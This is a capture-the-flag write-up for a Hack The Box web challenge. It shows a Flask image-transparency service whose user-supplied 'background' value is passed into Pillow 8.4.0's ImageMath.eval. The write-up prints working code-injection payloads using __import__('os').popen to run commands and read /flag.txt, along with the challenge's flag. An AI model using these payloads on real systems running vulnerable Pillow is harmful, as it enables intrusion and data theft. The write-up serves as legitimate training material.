# Admist Us
![](Pasted%20image%2020220515101222.png)

Library CVE to RCE exploit

## Solution

### Reading Code

I downloaded the zip file to reveal a Docker image running a Python Flask web app

In `Dockerfile`, its just basic setting up stuff

```
FROM python:3.7-alpine

# Install packages
RUN apk add --update --no-cache supervisor python3-dev jpeg-dev libpng-dev freetype-dev gcc musl-dev

# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install Flask

# Add user
RUN adduser -D -u 1000 -g 1000 -s /bin/sh www

# Copy flag
COPY flag.txt /flag.txt

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .
RUN chown -R www:www .

# Install python dependencies
RUN python -m pip install -r requirements.txt

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

In `web_amidst_us/challenge/requirements.txt`, list of libraries used, and ones we could potentially exploit

```
wheel
Pillow==8.4.0
```

In `web_amidst_us/challenge/application/blueprints/routes.py`, there is a route to `util.py`

```python
from flask import Blueprint, request, render_template, abort
from application.util import make_alpha

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
	return render_template('index.html')

@api.route('/alphafy', methods=['POST'])
def alphafy():
	if not request.is_json or 'image' not in request.json:
		return abort(400)

	return make_alpha(request.json)
```

In `web_amidst_us/challenge/application/util.py`, there is the Pillow library used (named PIL), to process an image

```python
import os, base64
from PIL import Image, ImageMath
from io import BytesIO

generate = lambda x: os.urandom(x).hex()

def make_alpha(data):
	color = data.get('background', [255,255,255])

	try:
		dec_img = base64.b64decode(data.get('image').encode())

		image = Image.open(BytesIO(dec_img)).convert('RGBA')
		img_bands = [band.convert('F') for band in image.split()]

		alpha = ImageMath.eval(
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}),
					difference1(green_band, {color[1]})
					),
					difference1(blue_band, {color[2]})
				),
				max(
					max(
					difference2(red_band, {color[0]}),
					difference2(green_band, {color[1]})
					),
					difference2(blue_band, {color[2]})
				)
				)
			)''',
			difference1=lambda source, color: (source - color) / (255.0 - color),
			difference2=lambda source, color: (color - source) / color,
			red_band=img_bands[0],
			green_band=img_bands[1],
			blue_band=img_bands[2]
		)

		new_bands = [
			ImageMath.eval(
				'convert((image - color) / alpha + color, "L")',
				image=img_bands[i],
				color=color[i],
				alpha=alpha
			)
			for i in range(3)
		]

		new_bands.append(ImageMath.eval(
			'convert(alpha_band * alpha, "L")',
			alpha=alpha,
			alpha_band=img_bands[3]
		))

		new_image = Image.merge('RGBA', new_bands)
		background = Image.new('RGB', new_image.size, (0, 0, 0, 0))
		background.paste(new_image.convert('RGB'), mask=new_image)

		buffer = BytesIO()
		new_image.save(buffer, format='PNG')

		return {
			'image': f'data:image/png;base64,{base64.b64encode(buffer.getvalue()).decode()}'
		}, 200

	except Exception:
		return '', 400

```

In `web_amidst_us/challenge/static/js/main.js`, there is a function to send an image in the HTML to the web server

```js
$(document).ready(function() {
	listInvoice();
	$('#create-btn').on('click', showForm);
	$('#save-btn').on('click', addInvoice);
	window.easyMDE = new EasyMDE({element: $('#markdown_content')[0], renderingConfig: {singleLineBreaks: false}});
});

const showForm = () => {
	$('#invoices_view').hide();
	$('#markdown_view').slideDown();
}

const populateTable = (data) => {
	tRow = `<tr>
				<td>${data.invoice_id}</td>
				<td>${data.created}</td>
				<td><a href="/static/invoices/${data.invoice_id}.pdf" target="_blank">PDF</a></td>
				<td><a href="#" onclick="removeInvoice('${data.invoice_id}')">Delete</a></td>
			</tr>`;
	$('#invoice-list').append(tRow);
}

const listInvoice = async () => {
	await fetch('/api/invoice/list', {
		method: 'GET'
	})
	.then((response) => response.json()
		.then((data) => {
			if (response.status == 200) {
				for (let row of data) {
					populateTable(row);
				}
				return;
			}
		}))
	.catch((error) => {
		console.log(error);
	});
};

const removeInvoice = async (invoice_id) => {
	await fetch('/api/invoice/delete', {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
		},
		body: JSON.stringify({invoice_id}),
	})
	.then((response) => {
		location.reload();
	})
	.catch((error) => {
		console.log(error);
	});
}

const addInvoice = async () => {

	$('#save-btn').prop('disabled', true);

	let card = $('#resp-msg');
	card.hide();

	let loading = $('#loading_view');
	loading.show();
	$('.pdf_frame').hide();

	let markdown_content = window.easyMDE.value();

	if ($.trim(markdown_content) === '') {
		$('#save-btn').prop('disabled', false);
		card.text('Please add some content first!');
		card.attr('class', 'alert alert-danger');
		card.show();
		loading.hide();
		return;
	}

	await fetch('/api/invoice/add', {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({markdown_content}),
		})
		.then((response) => response.json()
			.then((data) => {
				if (response.status == 200) {
					window.setTimeout(function() {
						loading.hide();
						location.reload();
						}, 2500);
						return;
				} else {
					loading.hide();
					card.text(data.message);
					card.attr('class', 'alert alert-danger');
					card.show();
				}
			}))
		.catch((error) => {
			loading.hide();
			card.text(error);
			card.attr('class', 'alert alert-danger');
			card.show();
		});
}
```


### Testing Website

![](Pasted%20image%2020220515102330.png)

Clicking on the right image reveals this

![](Pasted%20image%2020220515102819.png)

You can click on the UFO to upload an image

![](Pasted%20image%2020220515102411.png)

The Image uploaded is this: the image from the CTF platform lol

![](Pasted%20image%2020220515102430.png)

You can hence guess that this is a website to make the white parts transparent

### Pillow CVE

I looked at `challenge/requirements.txt` to reveal that `Pillow==8.4.0` is used. I searched the library for any exploits, which revealed RCE with `ImageMath.eval()` for any version of the library below 9.0

https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901
https://github.com/python-pillow/Pillow/commit/8531b01d6cdf0b70f256f93092caa2a5d91afc11


### Burp Intercept

I tried Using Burp Suite Proxy to intercept the image sending request

![](Pasted%20image%2020220515103604.png)

![](Pasted%20image%2020220515103819.png)

In `util.py`, there is a section of the code where `ImageMath.eval` accesses unfiltered input from background

```python
		color = data.get('background', [255,255,255])
		...
		alpha = ImageMath.eval(
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}),
					difference1(green_band, {color[1]})
					),
					difference1(blue_band, {color[2]})
				),
				max(
					max(
					difference2(red_band, {color[0]}),
					difference2(green_band, {color[1]})
					),
					difference2(blue_band, {color[2]})
				)
				)
			)''',
```

We could potentially change it such that `colour[0]` or other indexes store a string to automatically execute code

I tried editing the background variable to write an output to the static directory

```
"background":["255 if len(__import__('os').popen('whoami > /app/application/static/flag.txt').read()) != None else 255",255,255]}
```

```
(base) [hacker@hackerbook ~]$ curl http://46.101.95.192:30335/static/flag.txt
www
(base) [hacker@hackerbook ~]$ 
```


### Reading the flag


```
"background":["255 if len(__import__('os').popen('cat /flag.txt > /app/application/static/flag.txt').read()) != None else 255",255,255]}
```

```
(base) [hacker@hackerbook ~]$ curl http://46.101.95.192:30335/static/flag.txt
HTB{i_slept_my_way_to_rce}(base) [hacker@hackerbook ~]$ 
```



## Flag
`HTB{i_slept_my_way_to_rce}`
``